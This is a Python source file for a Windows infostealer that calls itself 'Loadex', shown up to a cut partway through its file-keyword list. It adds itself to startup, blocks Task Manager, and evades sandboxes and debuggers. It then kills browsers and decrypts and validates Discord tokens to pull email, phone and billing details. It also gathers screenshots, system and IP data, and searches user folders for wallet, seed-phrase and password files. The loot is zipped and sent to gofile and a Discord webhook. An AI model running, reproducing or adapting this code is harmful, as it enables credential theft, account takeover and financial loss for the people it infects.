import shutil
import requests
import platform
import socket
import getpass
import psutil
import os
import re
import sys
import subprocess
import ctypes
import json
import base64
import sqlite3
import zipfile
import random
import time

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
from contextlib import suppress
from pathlib import Path


class Paths:
    def __init__(self):
        self.temp = Path(os.environ["TEMP"])
        self.windows = os.environ.get("WINDIR")
        self.userprofile = Path(os.environ["USERPROFILE"])
        self.appdata_local = Path(os.environ["LOCALAPPDATA"])
        self.appdata_roaming = Path(os.environ["APPDATA"])

        program_files = os.environ.get("ProgramFiles")
        program_files_x86 = os.environ.get("ProgramFiles(x86)")
        self.program_files = Path(program_files or program_files_x86)
        self.program_files_x86 = Path(program_files_x86)


class Loadex:
    def __init__(self):
        self.zip_name = f"LOADEX_{random.randint(10000000000, 99999999999)}.zip"
        self.webhook_url = "https://discord.com/api/9/"
        self.Loadx_version = "1.5.2"
        self.malware_name = "Loadex loadx"
        self.malware_author = "https://t.me/Loadex"
        self.browser_infos = [
            "extentions",
            "passwords",
            "cookies",
            "history",
            "downloads",
            "cards",
        ]
        self.session_files = ["Wallets", "Apps"]
        self.task_manager_blocked = False

    def delete_file(self, file_path):
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception:
            pass

    def startup_persistence(self):
        try:
            src = os.path.abspath(sys.argv[0])
            dst_dir = os.path.join(
                Paths().appdata_roaming,
                "Microsoft",
                "Windows",
                "Start Menu",
                "Programs",
                "Startup",
            )
            dst = os.path.join(dst_dir, os.path.basename(src))

            if not os.path.exists(dst_dir):
                os.makedirs(dst_dir)

            if not os.path.exists(dst):
                shutil.copy2(src, dst)
        except Exception:
            pass

    def block_task_manager(self):
        try:
            key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            registry = ctypes.windll.advapi32.RegCreateKeyExW
            hkey = ctypes.c_void_p()
            result = registry(
                ctypes.c_void_p(0x80000002),
                key,
                0,
                None,
                0,
                0xF003F,
                None,
                ctypes.byref(hkey),
                None,
            )
            if result == 0:
                value = ctypes.c_uint32(1)
                ctypes.windll.advapi32.RegSetValueExW(
                    hkey, "DisableTaskMgr", 0, 4, ctypes.byref(value), 4
                )
                ctypes.windll.advapi32.RegCloseKey(hkey)
        except Exception:
            pass

    def unblock_task_manager(self):
        try:
            key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            registry = ctypes.windll.advapi32.RegCreateKeyExW
            hkey = ctypes.c_void_p()
            result = registry(
                ctypes.c_void_p(0x80000002),
                key,
                0,
                None,
                0,
                0xF003F,
                None,
                ctypes.byref(hkey),
                None,
            )
            if result == 0:
                value = ctypes.c_uint32(0)
                ctypes.windll.advapi32.RegSetValueExW(
                    hkey, "DisableTaskMgr", 0, 4, ctypes.byref(value), 4
                )
                ctypes.windll.advapi32.RegCloseKey(hkey)
        except Exception:
            pass

    def send_webhook(self, gofile_url=None, file_path=None):
        try:
            embed = {
                "title": "• Basic system infos:",
                "color": 0xE53935,
                "fields": [
                    {
                        "name": "Hostname:",
                        "value": f"```{socket.gethostname()}```",
                        "inline": True,
                    },
                    {
                        "name": "Username:",
                        "value": f"```{getpass.getuser()}```",
                        "inline": True,
                    },
                    {
                        "name": "Machine:",
                        "value": f"```{platform.machine()}```",
                        "inline": True,
                    },
                    {
                        "name": "System:",
                        "value": f"```{platform.system()}```",
                        "inline": True,
                    },
                    {
                        "name": "Release:",
                        "value": f"```{platform.release()}```",
                        "inline": True,
                    },
                    {
                        "name": "Version:",
                        "value": f"```{platform.version()}```",
                        "inline": True,
                    },
                ],
                "footer": {
                    "text": "• God's in his heaven. All's right with the world."
                },
            }

            components = [
                {
                    "type": 1,
                    "components": [
                        {
                            "type": 2,
                            "style": 5,
                            "label": "Download File",
                            "url": gofile_url,
                        },
                        {
                            "type": 2,
                            "style": 5,
                            "label": "Github",
                            "url": "https://github.com/Loadexxx",
                        },
                    ],
                }
            ]

            payload = {
                "username": self.malware_name,
                "embeds": [embed],
                "components": components,
            }

            if file_path and os.path.exists(file_path):
                with open(file_path, "rb") as f:
                    files = {"file": (os.path.basename(file_path), f)}
                    requests.post(
                        self.webhook_url + "?with_components=true",
                        data={"payload_json": json.dumps(payload)},
                        files=files,
                    )
            else:
                requests.post(self.webhook_url + "?with_components=true", json=payload)

        except Exception as e:
            print("Erro:", e)

    def upload_gofile(self, file_path):
        try:
            with open(file_path, "rb") as f:
                files = {"file": f}
                response = requests.post(
                    "https://upload.gofile.io/uploadFile", files=files
                )
                if response.status_code == 200:
                    result = response.json()
                    if result.get("status") == "ok":
                        return result["data"]["downloadPage"]
            return None
        except Exception:
            return None

    def start_Loadx(self, zip_file):
        try:
            try:
                interesting_files = LoadxFunctions.Interesting_Files(zip_file)
                print("Interesting files collected:", interesting_files)
            except:
                print("Error collecting interesting files.")
            try:
                screenshot_taken = LoadxFunctions.Screenshot(zip_file)
                print("Screenshot taken:", screenshot_taken)
            except:
                print("Error taking screenshot.")
            try:
                discord_tokens = LoadxFunctions.Discord_Tokens(zip_file)
                print("Discord tokens collected:", discord_tokens)
            except:
                print("Error collecting Discord tokens.")
            try:
                session_files = LoadxFunctions.Session_files(
                    zip_file, self.session_files
                )
                print("Session files collected:", session_files)
            except:
                print("Error collecting session files.")
            try:
                browser_Infos = LoadxFunctions.Browser_Infos(
                    zip_file, self.browser_infos
                )
                print("Browser infos collected:", browser_Infos)
            except:
                print("Error collecting browser infos.")
            try:
                system_infos = LoadxFunctions.System_Infos(zip_file)
                print("System infos collected:", system_infos)
            except:
                print("Error collecting system infos.")

            return True
        except Exception as e:
            print("Exeption (start_Loadx): ", e)
            return False

    def main(self):
        try:
            self.startup_persistence()

            if not Checks.is_windows():
                print("not windows os")
                return
            if not Checks.is_connected():
                print("no internet connection")
                return
            if Checks.is_sandboxed():
                print("detected sandbox environment")
                return
            if Checks.is_debugged():
                print("detected debugger")
                return

            if Checks.is_admin():
                self.block_task_manager()
                self.task_manager_blocked = True

            zip_file_path = os.path.join(Paths().temp, self.zip_name)
            zip_file = zipfile.ZipFile(zip_file_path, "w", zipfile.ZIP_DEFLATED)

            sucess = self.start_Loadx(zip_file)

            zip_file.close()

            if sucess:
                print("Stealing completed successfully.")
                gofile_url = self.upload_gofile(zip_file_path)
                if gofile_url:
                    self.send_webhook(gofile_url=gofile_url, file_path=None)
                else:
                    self.send_webhook(gofile_url=None, file_path=zip_file_path)

                self.delete_file(zip_file_path)
            else:
                print("Stealing failed.")

            if self.task_manager_blocked:
                self.unblock_task_manager()
                self.task_manager_blocked = False
        except Exception:
            pass


class AntiSandbox:
    DLL_INDICATORS = [
        "SbieDll.dll",
        "VBoxHook.dll",
        "VBoxSF.dll",
        "VBoxDisp.dll",
        "vmcheck.dll",
        "wpespy.dll",
        "snxhk.dll",
        "dbghelp.dll",
        "dbgcore.dll",
    ]

    VM_MAC_PREFIXES = [
        "00:05:69",  # VMware
        "00:0C:29",
        "00:1C:14",
        "00:50:56",
        "08:00:27",  # VirtualBox
    ]

    @staticmethod
    def detect_dlls() -> bool:
        GetModuleHandle = ctypes.windll.kernel32.GetModuleHandleA
        for dll in AntiSandbox.DLL_INDICATORS:
            if GetModuleHandle(dll.encode()) != 0:
                return True
        return False

    @staticmethod
    def detect_mac() -> bool:
        try:
            output = subprocess.check_output("getmac", creationflags=0x08000000)
            output = output.decode(errors="ignore")

            macs = re.findall(r"([0-9A-F]{2}(?:-[0-9A-F]{2}){5})", output, re.I)
            macs = [mac.replace("-", ":").lower() for mac in macs]

            for mac in macs:
                if any(
                    mac.startswith(prefix.lower())
                    for prefix in AntiSandbox.VM_MAC_PREFIXES
                ):
                    return True
        except:
            pass
        return False

    @staticmethod
    def detect_hardware() -> bool:
        try:

            class MEMORYSTATUS(ctypes.Structure):
                _fields_ = [
                    ("dwLength", ctypes.c_ulong),
                    ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]

            mem = MEMORYSTATUS()
            mem.dwLength = ctypes.sizeof(mem)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))

            ram_gb = mem.ullTotalPhys / (1024**3)

            cpu_count = os.cpu_count()

            return ram_gb < 3 or cpu_count <= 2

        except:
            return False

    @staticmethod
    def detect_boot_time() -> bool:
        try:
            uptime = time.time() - psutil.boot_time()
            return uptime < 60
        except:
            return False

    @staticmethod
    def detect_wine() -> bool:
        return os.path.exists("C:\\windows\\system32\\wineboot.exe")


class Checks:
    @staticmethod
    def is_connected() -> bool:
        try:
            requests.get("https://www.google.com", timeout=5)
            return True
        except (requests.ConnectionError, requests.Timeout):
            return False

    @staticmethod
    def is_windows() -> bool:
        return platform.system().lower() == "windows"

    @staticmethod
    def is_admin() -> bool:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    @staticmethod
    def is_sandboxed() -> bool:
        checks = [
            AntiSandbox.detect_mac(),
            AntiSandbox.detect_dlls(),
            AntiSandbox.detect_wine(),
            AntiSandbox.detect_hardware(),
            AntiSandbox.detect_boot_time(),
        ]
        return any(checks)

    @staticmethod
    def is_debugged() -> bool:
        blacklist_programs = [
            "cheatengine",
            "cheat engine",
            "x32dbg",
            "x64dbg",
            "ollydbg",
            "windbg",
            "ida",
            "ida64",
            "ghidra",
            "radare2",
            "radare",
            "dbg",
            "immunitydbg",
            "dnspy",
            "softice",
            "edb",
            "debugger",
            "visual studio debugger",
            "lldb",
            "gdb",
            "valgrind",
            "hex-rays",
            "disassembler",
            "tracer",
            "debugview",
            "procdump",
            "strace",
            "ltrace",
            "drmemory",
            "decompiler",
            "hopper",
            "binary ninja",
            "bochs",
            "vdb",
            "frida",
            "api monitor",
            "process hacker",
            "sysinternals",
            "procexp",
            "process explorer",
            "monitor tool",
            "vmmap",
            "xperf",
            "perfview",
            "py-spy",
            "strace-log",
            "vboxservice",
            "vboxtray",
            "vmtoolsd",
            "vmwaretray",
            "vmwareuser",
            "wireshark",
            "procmon",
        ]
        try:
            for proc in psutil.process_iter(["name"]):
                try:
                    name = proc.info["name"].lower()
                    if any(x in name for x in blacklist_programs):
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except Exception:
            pass

        return False

class LoadxFunctions:

    @staticmethod
    def System_Infos(zip_file):
        info = False
        space = " "

        def info():
            ip_info = ""
            with suppress(Exception):
                eva = requests.get("https://ipwhois.app/json/").json()
                for i in eva:
                    len_i = len(i)
                    pad = 20 - len_i
                    ip_info += f"    - {i}{space * pad}: {eva[i]}\n"
                return ip_info
            return """No IP infos."""

        try:
            IPinfos = info()

            cpu_count = psutil.cpu_count(logical=True)
            ram_total = round(psutil.virtual_memory().total / (1024**3), 2)
            disk_usage = psutil.disk_usage("/").percent

            net_info = ""
            with suppress(Exception):
                interfaces = psutil.net_if_addrs()
                max_len = max(len(i) for i in interfaces)

                for iface, addr_list in interfaces.items():
                    for addr in addr_list:
                        if addr.family == socket.AF_INET:
                            pad = max_len - len(iface)
                            net_info += f"    - {iface}{space * pad} : {addr.address}\n"

            system_infos = f"""
System infos:
    - hostname      : {socket.gethostname()}
    - username      : {getpass.getuser()}
    - processor     : {platform.processor()}
    - machine       : {platform.machine()}
    - platform      : {platform.platform()}
    - system        : {platform.system()}
    - release       : {platform.release()}
    - version       : {platform.version()}
    - CPU cores     : {cpu_count}
    - RAM total(GB) : {ram_total}
    - Disk usage(%) : {disk_usage}
    - local IP      : {socket.gethostbyname(socket.gethostname())}

Network interfaces:
{net_info}
Public IP infos:
{IPinfos}
        """
            info = True
        except:
            info = False
            system_infos = "No infos."

        zip_file.writestr("system_infos.txt", system_infos)
        return info

    @staticmethod
    def Discord_Tokens(zip_file):
        file_discord_account = ""
        number_discord_account = 0

        def ExtractToken():
            base_url = "https://discord.com/api/v9/users/@me"
            regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
            regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
            tokens = []
            uids = []
            token_info = {}

            path_appdata_local = Paths().appdata_local
            path_appdata_roaming = Paths().appdata_roaming

            paths = [
                (
                    "Discord",
                    os.path.join(
                        path_appdata_roaming,
                        "discord",
                        "Local Storage",
                        "leveldb",
                    ),
                    "",
                ),
                (
                    "Discord Canary",
                    os.path.join(
                        path_appdata_roaming,
                        "discordcanary",
                        "Local Storage",
                        "leveldb",
                    ),
                    "",
                ),
                (
                    "Lightcord",
                    os.path.join(
                        path_appdata_roaming,
                        "Lightcord",
                        "Local Storage",
                        "leveldb",
                    ),
                    "",
                ),
                (
                    "Discord PTB",
                    os.path.join(
                        path_appdata_roaming,
                        "discordptb",
                        "Local Storage",
                        "leveldb",
                    ),
                    "",
                ),
                (
                    "Opera",
                    os.path.join(
                        path_appdata_roaming,
                        "Opera Software",
                        "Opera Stable",
                        "Local Storage",
                        "leveldb",
                    ),
                    "opera.exe",
                ),
                (
                    "Opera GX",
                    os.path.join(
                        path_appdata_roaming,
                        "Opera Software",
                        "Opera GX Stable",
                        "Local Storage",
                        "leveldb",
                    ),
                    "opera.exe",
                ),
                (
                    "Opera Neon",
                    os.path.join(
                        path_appdata_roaming,
                        "Opera Software",
                        "Opera Neon",
                        "Local Storage",
                        "leveldb",
                    ),
                    "opera.exe",
                ),
                (
                    "Amigo",
                    os.path.join(
                        path_appdata_local,
                        "Amigo",
                        "User Data",
                        "Local Storage",
                        "leveldb",
                    ),
                    "amigo.exe",
                ),
                (
                    "Torch",
                    os.path.join(
                        path_appdata_local,
                        "Torch",
                        "User Data",
                        "Local Storage",
                        "leveldb",
                    ),
                    "torch.exe",
                ),
                (
                    "Kometa",
                    os.path.join(
                        path_appdata_local,
                        "Kometa",
                        "User Data",
                        "Local Storage",
                        "leveldb",
                    ),
                    "kometa.exe",
                ),
                (
                    "Orbitum",
                    os.path.join(
                        path_appdata_local,
                        "Orbitum",
                        "User Data",
                        "Local Storage",
                        "leveldb",
                    ),
                    "orbitum.exe",
                ),
                (
                    "CentBrowser",
                    os.path.join(
                        path_appdata_local,
                        "CentBrowser",
                        "User Data",
                        "Local Storage",
                        "leveldb",
                    ),
                    "centbrowser.exe",
                ),
                (
                    "7Star",
                    os.path.join(
                        path_appdata_local,
                        "7Star",
                        "7Star",
                        "User Data",
                        "Local Storage",
                        "leveldb",
                    ),
                    "7star.exe",
                ),
                (
                    "Sputnik",
                    os.path.join(
                        path_appdata_local,
                        "Sputnik",
                        "Sputnik",
                        "User Data",
                        "Local Storage",
                        "leveldb",
                    ),
                    "sputnik.exe",
                ),
                (
                    "Vivaldi",
                    os.path.join(
                        path_appdata_local,
                        "Vivaldi",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "vivaldi.exe",
                ),
                (
                    "Google Chrome",
                    os.path.join(
                        path_appdata_local,
                        "Google",
                        "Chrome",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "chrome.exe",
                ),
                (
                    "Google Chrome",
                    os.path.join(
                        path_appdata_local,
                        "Google",
                        "Chrome",
                        "User Data",
                        "Profile 1",
                        "Local Storage",
                        "leveldb",
                    ),
                    "chrome.exe",
                ),
                (
                    "Google Chrome",
                    os.path.join(
                        path_appdata_local,
                        "Google",
                        "Chrome",
                        "User Data",
                        "Profile 2",
                        "Local Storage",
                        "leveldb",
                    ),
                    "chrome.exe",
                ),
                (
                    "Google Chrome",
                    os.path.join(
                        path_appdata_local,
                        "Google",
                        "Chrome",
                        "User Data",
                        "Profile 3",
                        "Local Storage",
                        "leveldb",
                    ),
                    "chrome.exe",
                ),
                (
                    "Google Chrome",
                    os.path.join(
                        path_appdata_local,
                        "Google",
                        "Chrome",
                        "User Data",
                        "Profile 4",
                        "Local Storage",
                        "leveldb",
                    ),
                    "chrome.exe",
                ),
                (
                    "Google Chrome",
                    os.path.join(
                        path_appdata_local,
                        "Google",
                        "Chrome",
                        "User Data",
                        "Profile 5",
                        "Local Storage",
                        "leveldb",
                    ),
                    "chrome.exe",
                ),
                (
                    "Google Chrome SxS",
                    os.path.join(
                        path_appdata_local,
                        "Google",
                        "Chrome SxS",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "chrome.exe",
                ),
                (
                    "Google Chrome Beta",
                    os.path.join(
                        path_appdata_local,
                        "Google",
                        "Chrome Beta",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "chrome.exe",
                ),
                (
                    "Google Chrome Dev",
                    os.path.join(
                        path_appdata_local,
                        "Google",
                        "Chrome Dev",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "chrome.exe",
                ),
                (
                    "Google Chrome Unstable",
                    os.path.join(
                        path_appdata_local,
                        "Google",
                        "Chrome Unstable",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "chrome.exe",
                ),
                (
                    "Google Chrome Canary",
                    os.path.join(
                        path_appdata_local,
                        "Google",
                        "Chrome Canary",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "chrome.exe",
                ),
                (
                    "Epic Privacy Browser",
                    os.path.join(
                        path_appdata_local,
                        "Epic Privacy Browser",
                        "User Data",
                        "Local Storage",
                        "leveldb",
                    ),
                    "epic.exe",
                ),
                (
                    "Microsoft Edge",
                    os.path.join(
                        path_appdata_local,
                        "Microsoft",
                        "Edge",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "msedge.exe",
                ),
                (
                    "Uran",
                    os.path.join(
                        path_appdata_local,
                        "uCozMedia",
                        "Uran",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "uran.exe",
                ),
                (
                    "Yandex",
                    os.path.join(
                        path_appdata_local,
                        "Yandex",
                        "YandexBrowser",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "yandex.exe",
                ),
                (
                    "Yandex Canary",
                    os.path.join(
                        path_appdata_local,
                        "Yandex",
                        "YandexBrowserCanary",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "yandex.exe",
                ),
                (
                    "Yandex Developer",
                    os.path.join(
                        path_appdata_local,
                        "Yandex",
                        "YandexBrowserDeveloper",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "yandex.exe",
                ),
                (
                    "Yandex Beta",
                    os.path.join(
                        path_appdata_local,
                        "Yandex",
                        "YandexBrowserBeta",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "yandex.exe",
                ),
                (
                    "Yandex Tech",
                    os.path.join(
                        path_appdata_local,
                        "Yandex",
                        "YandexBrowserTech",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "yandex.exe",
                ),
                (
                    "Yandex SxS",
                    os.path.join(
                        path_appdata_local,
                        "Yandex",
                        "YandexBrowserSxS",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "yandex.exe",
                ),
                (
                    "Brave",
                    os.path.join(
                        path_appdata_local,
                        "BraveSoftware",
                        "Brave-Browser",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "brave.exe",
                ),
                (
                    "Iridium",
                    os.path.join(
                        path_appdata_local,
                        "Iridium",
                        "User Data",
                        "Default",
                        "Local Storage",
                        "leveldb",
                    ),
                    "iridium.exe",
                ),
            ]

            try:
                for name, path, proc_name in paths:
                    for proc in psutil.process_iter(["pid", "name"]):
                        try:
                            if proc.name().lower() == proc_name.lower():
                                proc.kill()
                        except:
                            pass
            except:
                pass

            for name, path, proc_name in paths:
                if not os.path.exists(path):
                    continue
                _d15c0rd = name.replace(" ", "").lower()
                if "cord" in path:
                    if not os.path.exists(
                        os.path.join(path_appdata_roaming, _d15c0rd, "Local State")
                    ):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        total_path = os.path.join(path, file_name)
                        if os.path.exists(total_path):
                            with open(total_path, errors="ignore") as file:
                                for line in file:
                                    for y in re.findall(regexp_enc, line.strip()):
                                        token = DecryptVal(
                                            base64.b64decode(
                                                y.split("dQw4w9WgXcQ:")[1]
                                            ),
                                            GetMasterKey(
                                                os.path.join(
                                                    path_appdata_roaming,
                                                    _d15c0rd,
                                                    "Local State",
                                                )
                                            ),
                                        )
                                        if ValidateToken(token, base_url):
                                            uid = requests.get(
                                                base_url,
                                                headers={"Authorization": token},
                                            ).json()["id"]
                                            if uid not in uids:
                                                tokens.append(token)
                                                uids.append(uid)
                                                token_info[token] = (
                                                    name,
                                                    total_path,
                                                )
                else:
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        total_path = os.path.join(path, file_name)
                        if os.path.exists(total_path):
                            with open(total_path, errors="ignore") as file:
                                for line in file:
                                    for token in re.findall(regexp, line.strip()):
                                        if ValidateToken(token, base_url):
                                            uid = requests.get(
                                                base_url,
                                                headers={"Authorization": token},
                                            ).json()["id"]
                                            if uid not in uids:
                                                tokens.append(token)
                                                uids.append(uid)
                                                token_info[token] = (
                                                    name,
                                                    total_path,
                                                )

            if os.path.exists(
                os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles")
            ):
                for path, _, files in os.walk(
                    os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles")
                ):
                    for _file in files:
                        if _file.endswith(".sqlite"):
                            with open(
                                os.path.join(path, _file), errors="ignore"
                            ) as file:
                                for line in file:
                                    for token in re.findall(regexp, line.strip()):
                                        if ValidateToken(token, base_url):
                                            uid = requests.get(
                                                base_url,
                                                headers={"Authorization": token},
                                            ).json()["id"]
                                            if uid not in uids:
                                                tokens.append(token)
                                                uids.append(uid)
                                                token_info[token] = (
                                                    "Firefox",
                                                    os.path.join(path, _file),
                                                )
            return tokens, token_info

        def ValidateToken(token, base_url):
            return (
                requests.get(base_url, headers={"Authorization": token}).status_code
                == 200
            )

        def DecryptVal(buff, master_key):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()

        def GetMasterKey(path):
            if not os.path.exists(path):
                return None
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return CryptUnprotectData(master_key, None, None, None, 0)[1]

        tokens, token_info = ExtractToken()

        if not tokens:
            file_discord_account = "No discord tokens found."

        for token_d15c0rd in tokens:
            number_discord_account += 1

            try:
                api = requests.get(
                    "https://discord.com/api/v8/users/@me",
                    headers={"Authorization": token_d15c0rd},
                ).json()
            except:
                api = {"None": "None"}

            u53rn4m3_d15c0rd = (
                api.get("username", "None") + "#" + api.get("discriminator", "None")
            )
            d15pl4y_n4m3_d15c0rd = api.get("global_name", "None")
            us3r_1d_d15c0rd = api.get("id", "None")
            em4i1_d15c0rd = api.get("email", "None")
            em4il_v3rifi3d_d15c0rd = api.get("verified", "None")
            ph0n3_d15c0rd = api.get("phone", "None")
            c0untry_d15c0rd = api.get("locale", "None")
            mf4_d15c0rd = api.get("mfa_enabled", "None")

            try:
                if api.get("premium_type", "None") == 0:
                    n1tr0_d15c0rd = "False"
                elif api.get("premium_type", "None") == 1:
                    n1tr0_d15c0rd = "Nitro Classic"
                elif api.get("premium_type", "None") == 2:
                    n1tr0_d15c0rd = "Nitro Boosts"
                elif api.get("premium_type", "None") == 3:
                    n1tr0_d15c0rd = "Nitro Basic"
                else:
                    n1tr0_d15c0rd = "False"
            except:
                n1tr0_d15c0rd = "None"

            try:
                av4t4r_ur1_d15c0rd = (
                    f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif"
                    if requests.get(
                        f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif"
                    ).status_code
                    == 200
                    else f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.png"
                )
            except:
                av4t4r_ur1_d15c0rd = "None"

            try:
                billing_discord = requests.get(
                    "https://discord.com/api/v6/users/@me/billing/payment-sources",
                    headers={"Authorization": token_d15c0rd},
                ).json()
                if billing_discord:
                    p4ym3nt_m3th0d5_d15c0rd = []

                    for method in billing_discord:
                        if method["type"] == 1:
                            p4ym3nt_m3th0d5_d15c0rd.append("Bank Card")
                        elif method["type"] == 2:
                            p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
                        else:
                            p4ym3nt_m3th0d5_d15c0rd.append("Other")
                    p4ym3nt_m3th0d5_d15c0rd = " / ".join(p4ym3nt_m3th0d5_d15c0rd)
                else:
                    p4ym3nt_m3th0d5_d15c0rd = "None"
            except:
                p4ym3nt_m3th0d5_d15c0rd = "None"

            try:
                gift_codes = requests.get(
                    "https://discord.com/api/v9/users/@me/outbound-promotions/codes",
                    headers={"Authorization": token_d15c0rd},
                ).json()
                if gift_codes:
                    codes = []
                    for g1ft_c0d35_d15c0rd in gift_codes:
                        name = g1ft_c0d35_d15c0rd["promotion"]["outbound_title"]
                        g1ft_c0d35_d15c0rd = g1ft_c0d35_d15c0rd["code"]
                        data = f'Gift: "{name}" Code: "{g1ft_c0d35_d15c0rd}"'
                        if len("\n\n".join(g1ft_c0d35_d15c0rd)) + len(data) >= 1024:
                            break
                        codes.append(data)
                    if len(codes) > 0:
                        g1ft_c0d35_d15c0rd = "\n\n".join(codes)
                    else:
                        g1ft_c0d35_d15c0rd = "None"
                else:
                    g1ft_c0d35_d15c0rd = "None"
            except:
                g1ft_c0d35_d15c0rd = "None"

            try:
                software_name, path = token_info.get(
                    token_d15c0rd, ("Unknown", "Unknown")
                )
            except:
                software_name, path = "Unknown", "Unknown"

            file_discord_account = (
                file_discord_account
                + f"""
Discord Account n°{str(number_discord_account)}:
- Path Found      : {path}
- Software        : {software_name}
- Token           : {token_d15c0rd}
- Username        : {u53rn4m3_d15c0rd}
- Display Name    : {d15pl4y_n4m3_d15c0rd}
- Id              : {us3r_1d_d15c0rd}
- Email           : {em4i1_d15c0rd}
- Email Verified  : {em4il_v3rifi3d_d15c0rd}
- Phone           : {ph0n3_d15c0rd}
- Nitro           : {n1tr0_d15c0rd}
- Language        : {c0untry_d15c0rd}
- Billing         : {p4ym3nt_m3th0d5_d15c0rd}
- Gift Code       : {g1ft_c0d35_d15c0rd}
- Profile Picture : {av4t4r_ur1_d15c0rd}
- Multi-Factor Authentication : {mf4_d15c0rd}
"""
            )
        zip_file.writestr(
            f"Discord Accounts ({number_discord_account}).txt",
            file_discord_account,
        )

        return number_discord_account

    @staticmethod
    def Interesting_Files(zip_file):
        path_userprofile = Paths().userprofile
        path_appdata_roaming = Paths().appdata_roaming
        extensions = (
            ".txt",
            ".log",
            ".ini",
            ".json",
            ".xml",
            ".csv",
            ".md",
            ".rtf",
            ".cfg",
            ".conf",
            ".png",
            ".jpg",
            ".jpeg",
            ".bmp",
            ".gif",
            ".tiff",
            ".svg",
            ".webp",
            ".pdf",
            ".doc",
            ".docx",
            ".xls",
            ".xlsx",
            ".ppt",
            ".pptx",
            ".odt",
            ".ods",
            ".odp",
            ".zip",
            ".rar",
            ".7z",
            ".tar",
            ".gz",
            ".bz2",
            ".mp4",
            ".avi",
            ".mkv",
            ".mov",
            ".wmv",
            ".flv",
            ".mp3",
            ".wav",
            ".aac",
            ".flac",
            ".ogg",
        )

        paths = [
            os.path.join(path_userprofile, "Desktop"),
            os.path.join(path_userprofile, "Downloads"),
            os.path.join(path_userprofile, "Documents"),
            os.path.join(path_userprofile, "Picture"),
            os.path.join(path_userprofile, "Video"),
            os.path.join(path_userprofile, "OneDrive"),
            os.path.join(path_appdata_roaming, "Microsoft", "Windows", "Recent"),
        ]

        keywords = [
            "2fa",
            "mfa",
            "2step",
            "otp",
            "verification",
            "verif",
            "verify",
            "acount",
            "account",
            "compte",
            "identifiant",
            "login",
            "conta",
            "contas",
            "personnel",
            "personal",
            "perso",
            "banque",
            "bank",
            "funds",
            "fonds",
            "paypal",
            "casino",
            "banco",
            "saldo",
            "crypto",
            "cryptomonnaie",
            "bitcoin",
            "btc",
            "eth",
            "ethereum",
            "atomic",
            "exodus",
            "binance",
            "metamask",
            "trading",
            "échange",
            "exchange",
            "wallet",
            "portefeuille",
            "ledger",
            "trezor",
            "seed",
            "seed phrase",
            "phrase de récupération",
            "recovery",
            "récupération",
            "recovery phrase",
            "phrase de récupération",
            "mnemonic",
            "mnémonique",
            "passphrase",
            "phrase secrète",
            "wallet key",
            "clé de portefeuille",
            "mywallet",
            "backupwallet",
            "wallet backup",
            "sauvegarde de portefeuille",
            "private key",
            "clé privée",
            "keystore",
            "trousseau",
            "json",
            "trustwallet",
            "safepal",
            "coinbase",
            "kucoin",
            "kraken",
            "blockchain",
            "bnb",
            "usdt",
            "telegram",
            "disc",
            "discord",
            "token",
            "tkn",
            "webhook",
            "api",
            "bot",
            "tokendisc",
            "key",
            "clé",
            "cle",
            "keys",
            "private",
            "prive",
            "privé",
            "secret",
            "steal",
            "voler",
            "access",
            "auth",
            "mdp",
            "motdepasse",
            "mot_de_passe",
            "password",
            "psw",
            "pass",
            "passphrase",
            "phrase",
            "pwd",
            "passwords",
